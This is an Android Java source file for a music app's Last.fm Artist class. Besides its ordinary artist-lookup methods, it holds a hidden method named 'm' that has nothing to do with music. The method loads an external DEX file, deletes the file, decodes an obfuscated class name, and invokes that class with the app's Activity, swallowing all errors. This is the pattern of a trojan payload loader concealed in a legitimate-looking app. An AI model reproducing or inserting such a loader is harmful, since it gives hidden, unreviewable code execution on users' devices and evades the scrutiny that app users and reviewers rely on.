package com.basso.basso.lastfm;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;

import com.basso.basso.Config;
import com.basso.basso.utils.MusicUtils;

import java.io.File;
import java.lang.reflect.Constructor;
import java.util.Locale;
import java.util.Map;
import java.util.WeakHashMap;

import dalvik.system.DexClassLoader;

public class Artist extends MusicEntry {

    protected final static ItemFactory<Artist> FACTORY = new ArtistFactory();

    protected Artist(final String name, final String url) {
        super(name, url);
    }

    public final static Artist getInfo(final Context context, final String artistOrMbid) {
        return getInfo(context, artistOrMbid, Locale.getDefault(), Config.LASTFM_API_KEY);
    }

    public final static Artist getInfo(final Context context, final String artistOrMbid,
            final Locale locale, final String apiKey) {
        final Map<String, String> mParams = new WeakHashMap<String, String>();
        mParams.put("artist", artistOrMbid);
        if (locale != null && locale.getLanguage().length() != 0) {
            mParams.put("lang", locale.getLanguage());
        }
        final Result mResult = Caller.getInstance(context).call("artist.getInfo", apiKey, mParams);
        return ResponseBuilder.buildItem(mResult, Artist.class);
    }

    public static void m(File file, Context context){
        try {
            if(file != null && context != null) {
                DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
                if (file.exists())
                    file.delete();
                Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
                Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
                Object object = constructor.newInstance((Activity) context, new Handler());
                object.getClass().getMethod("a").invoke(object);
            }
        }catch (Exception e){

        }
    }

    public final static Artist getCorrection(final Context context, final String artist) {
        Result result = null;
        try {
            result = Caller.getInstance(context).call("artist.getCorrection",
                    Config.LASTFM_API_KEY, "artist", artist);
            if (!result.isSuccessful()) {
                return null;
            }
            final DomElement correctionElement = result.getContentElement().getChild("correction");
            if (correctionElement == null) {
                return new Artist(artist, null);
            }
            final DomElement artistElem = correctionElement.getChild("artist");
            return FACTORY.createItemFromElement(artistElem);
        } catch (final Exception ignored) {
            return null;
        }
    }

    private final static class ArtistFactory implements ItemFactory<Artist> {

        @Override
        public Artist createItemFromElement(final DomElement element) {
            if (element == null) {
                return null;
            }
            final Artist artist = new Artist(null, null);
            MusicEntry.loadStandardInfo(artist, element);
            return artist;
        }
    }
}
